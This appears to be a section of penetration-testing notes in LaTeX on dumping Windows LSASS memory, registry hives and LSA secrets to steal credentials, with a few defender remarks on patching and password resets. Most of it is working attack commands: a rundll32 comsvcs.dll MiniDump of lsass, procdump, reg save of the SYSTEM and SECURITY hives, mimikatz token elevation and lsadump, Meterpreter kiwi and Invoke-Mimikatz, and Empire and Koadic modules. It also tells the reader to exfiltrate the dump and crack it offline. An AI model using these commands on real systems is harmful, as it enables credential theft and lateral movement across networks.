\section{LSA dumping}

\url{https://www.hackingarticles.in/credential-dumping-local-security-authority-lsalsass-exe/}
\url{https://www.hackingarticles.in/credential-dumping-security-support-provider-ssp/}


Things to consider: When you need to  execute commands/processes on a host, know what will and will not put  credential material into memory. When investigating, look for users that  may be performing the above activities on the impacted host.

How long does LSASS store credentials?
By default, LSASS stores credentials associated with logon sessions  related to those activities outlined above since the last restart, of  which have not been closed (logged off). This means that once a user is  logged off, LSASS may clear the credentials after a certain period of  time, which varies by operating system and security settings (default is  30 seconds in Windows versions 8.1+. Older systems may not always clear  credentials after logoff without patches).
Things to consider: Ensure hosts are fully  patched and credential clearing is enabled. Any user authenticated when a  potential credential dump occurs will likely need their password reset.  On legacy hosts, there may not be any clearing of credentials, even  after logoff. All users on these systems (when unpatched) may need a  password reset.

Why is LSASS targeted by malicious actors?
As you may have already guessed, the reason LSASS is such a  high-value target for attackers is that it contains credential material  for users, which can be used to pivot throughout the environment.
When an attacker gains their initial foothold into the environment,  they almost never land at their target host or permission set. For  example, if their phishing email to  the accounting department was successful, these users are probably not  able to access databases, domain controllers, medical records, etc.
Nearly all forms of lateral movement require credential material to move throughout an environment.

\subsection{Offline: Dumping memory}
Generate a dump file of the lsass memory according to one of the following
method. Then exfiltrate and use pypykatz~\ref{tool:pypykatz} to crack offline.


\subsubsection{Dumping with Task manager}

 open  the task manager, navigate to processes for exploring running process
 of lsass.exe and make a right-click to explore its snippet.  Choose  “Create
 Dump File” option which will dump the stored credential.

 the \verb+lsass.DMP+ is stored in \verb+C:\Users\<LOGIN>\AppData\Local\Temp+

 \subsection{Dumping with Rundll32.exe and Comsvcs.dll}

 Run \verb+tasklist /svc+ or \verb+Get-Process lsass+ to find lsass PID.

In powershell run (\verb+rundll32.exe+ to call an exported function of
    \verb+comsvcs.dll+  which also calls the \verb+MiniDumpWriteDump+
    (MiniDump) function to dump the LSASS process memory):
\begin{verbatim}
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
\end{verbatim}

\subsubsection{Dumping with ProcDump}
only on win7 ?

ProcDump tool is a free  command-line tool published by Sysinternals whose
primary purpose is  monitoring an application and generating memory dumps.

\begin{verbatim}
procdump.exe -accepteula -ma lsass.exe mem.dmp
\end{verbatim}

\subsection{Offline: Dumping registry}
Save system and security  registry values with the help of the following command.

\begin{verbatim}
reg save HKLM\SYSTEM system
reg save HKLM\security security
\end{verbatim}

\subsection{Online: Mimikatz}

\subsubsection{Token Impersonation}
using mimikatz to get  the hashes directly, without involving any dump file or DLL execution  this is known as “Token Impersonation”. 

This can be done by impersonate a token  that will be used to elevate permissions to SYSTEM (default) or find a  domain admin token and as the result.

\begin{verbatim}
privilege::debug
token::elevate
lsadump::secrets
\end{verbatim}



\subsubsection{editing File Permission in the Registry}
The LSA secrets are held in the  Registry. If services are run as local or
domain user, their passwords  are stored in the Registry. If auto-logon is
activated, it will also  store this information in the Registry. This can be
done also done locally by changing permission values inside the registry.
Navigate to \verb+Computer\HKEY_LOCAL_MACHINE\SECURITY+.


Expand the SECURITY folder and choose permissions from inside the list.
Allow “Full Control” to the Administrator user.

\begin{verbatim}
privilege::debug
lsadump::secrets
\end{verbatim}

\subsection{Remotely}

\subsubsection{Metasploit}

Method1: Load kiwi
As we all know Metasploit is like the  Swiss Knife, it comes with multiple modules thus it allows the attacker  to execute mimikatz remotely and extract the Lsass dump to fetch the  credentials. Since it is a post-exploitation thus you should have  meterpreter session of the host machine at Initial Phase and then load  kiwi in order to initialise mimikatz and execute the command.

\begin{verbatim}
lmeterpreter > load kiwi
meterpreter > lsa_dump_secrets
\end{verbatim}


Method2: Load powershell
Similarly, you can also load PowerShell  in the place of kiwi and perform the same operation, here we are using  PowerShell script of mimikatz. This can be done by executing the  following commands:

\begin{verbatim}
meterpreter > load powershell
meterpreter > powershell_import /root/powershell/Invoke-Mimikatz.ps1
meterpreter > sekurlsa::logonpasswords
\end{verbatim}


This will be dumping the password hashes as shown in the below image.

\subsubsection{PowerShell Empire}
Empire is one of the good Penetration Testing Framework that works like as Metasploit, you can download it from GitHub and install in your attacking machine in order to launch attack remotely.
This is a post exploit, thus first you  need to be compromised the host machine and then use the following  module for LSA secrets dumps

\begin{verbatim}
usemodule credentials/mimikatz/lsadump
execute
\end{verbatim}


As a result, it dumps password hashes saved as shown in the given image.

Koadic
Koadic, or COM Command \& Control,  is a Windows post-exploitation rootkit similar to other penetration  testing tools such as Meterpreter and Powershell Empire. It allows the  attacker to run comsvcs.dll that will call the minidump and fetch the  dump of lsass.exe to retrieve stored NTLM hashes. Read more from here

\begin{verbatim}
use comsvcs_lsass
\end{verbatim}


As a result, it dumped the password hashes saved as shown in the given image.

